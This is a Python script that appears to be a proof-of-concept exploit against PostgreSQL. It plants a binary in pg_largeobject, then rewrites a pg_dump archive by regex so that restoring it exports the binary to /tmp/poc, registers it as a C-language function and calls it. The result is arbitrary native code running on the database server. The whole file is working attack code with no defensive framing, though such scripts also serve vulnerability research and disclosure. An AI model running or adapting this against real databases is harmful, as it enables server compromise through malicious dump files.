from base64 import b64encode
from contextlib import closing
import os
import psycopg2
import re
from sys import argv

from util import create_database, drop_database, database, exec_psql


db_name = 'db'

if len(argv) == 1:
    create_database(db_name)

    exec_psql(["""SELECT lo_creat(0)"""], db=db_name)
else:
    loid = int(argv[1])

    with open('function_poc', 'rb') as fp:
        data = fp.read()

    chunk_size = 2048
    statements = []
    
    for idx, chunk in enumerate((data[i:i + chunk_size] for i in range(0, len(data), chunk_size))):
        b64 = b64encode(chunk)
        statements.append("""INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({}, {}, decode('{}', 'base64'))""".format(str(loid), str(idx), b64))

    exec_psql(statements, db=db_name)

    os.system('pg_dump -U postgres -d {} -Fc > lo_create.dump'.format(db_name))

    exec_psql(["""SELECT lo_unlink({})""".format(loid)], db=db_name)

    drop_database(db_name)

    create_database(db_name)

    exec_psql([
        """CREATE SEQUENCE seq START 1""",
        """SELECT nextval('seq')""",
        """CREATE SEQUENCE seq_padded_out_for_names START 10000000000000000""",
        """SELECT nextval('seq_padded_out_for_names')""",
        """CREATE SEQUENCE seq_z START 1""",
        """SELECT nextval('seq_z')"""], db=db_name)

    fname = 'lo_export.dump'

    os.system('pg_dump -U postgres -d {} -Fc > {}'.format(db_name, fname))

    with open(fname, 'rb') as fp:
        data = fp.read()

    repl = re.sub('(SELECT.*public.seq\x27.*;)', "SELECT lo_export({}, '/tmp/poc')            ;".format(loid), data)
    repl = re.sub('(SELECT.*public.seq_padded_out_for_names\x27.*;)', "CREATE FUNCTION public.poc() RETURNS int AS '/tmp/poc', 'pgfunc' LANGUAGE 'c' STRICT;", repl)
    repl = re.sub('(SELECT.*public.seq_z\x27.*;)', "select public.poc()                              ;", repl)

    with open(fname, 'wb') as fp:
        fp.write(repl)

    drop_database(db_name)
